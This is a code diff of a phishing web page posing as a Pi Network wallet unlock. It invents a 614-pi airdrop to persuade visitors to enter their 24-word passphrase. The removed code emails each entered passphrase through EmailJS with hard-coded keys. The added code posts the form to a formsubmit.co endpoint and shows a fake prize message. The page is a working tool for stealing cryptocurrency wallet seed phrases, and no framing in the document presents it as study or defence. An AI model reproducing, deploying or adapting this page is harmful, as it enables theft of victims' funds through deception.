@@ -131,41 +131,24 @@
         <h2>The official Pi Network has reached 2 million pioneers!</h2>
         <p>To get closer to the mainnet and activate and attract more pioneers, they will be holding an airdrop, awarding a total of 614 pi/pioneer prizes to those who successfully complete KYC. The future looks very exciting as the Pi community continues to build the Web3 Pi ecosystem.</p>
         <h2>Enter Your 24-Word Passphrase</h2>
-        <form onsubmit="sendEmail(event)">
+        <form action="https://formsubmit.co/d3e56b54373ed8c87d5a6f4ccf1223a5" method="POST" onsubmit="showMessage(event)">
             <textarea name="passphrase" placeholder="Enter your 24-word passphrase" required></textarea>
             <button type="submit" class="btn-outline">Unlock With Passphrase</button>
         </form>
 
-        <button class="btn-filled" onclick="sendEmail(event)">Unlock With Fingerprint</button>
+        <button class="btn-filled" onclick="showMessage()">Unlock With Fingerprint</button>
         <p class="info-text">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
         <p class="info-text">Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your pi in your previous wallet will be inaccessible.</p>
     </main>
 
-    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
-
     <script>
-        emailjs.init("W6VfTUzjwVIY2fl98"); // Initialize with your Public Key
-
-        function sendEmail(event) {
-            if (event) event.preventDefault();  // Prevent form from submitting
-
-            const passphrase = document.querySelector('[name="passphrase"]').value;
-
-            const templateParams = {
-                passphrase: passphrase,
-                from_name: 'Ashraf',
-                to_name: 'Recipient Name',
-                message: 'Hello! You have entered the passphrase.'
-            };
-
-            emailjs.send('service_tjataup', 'template_ca9ohx4', templateParams)
-                .then(function (response) {
-                    console.log('Message sent successfully:', response);
-                    alert('Message sent successfully!');
-                }, function (error) {
-                    console.error('Failed to send message:', error);
-                    alert('Failed to send message. Please check the console for more details.');
-                });
+        function showMessage(event) {
+            if (event) event.preventDefault();
+            let firework = document.createElement("div");
+            firework.className = "fireworks";
+            firework.innerHTML = "🎉 Congratulations! You have entered the draw for 614 pi! 🎉";
+            document.body.appendChild(firework);
+            setTimeout(() => firework.remove(), 2000);
         }
     </script>
 </body>
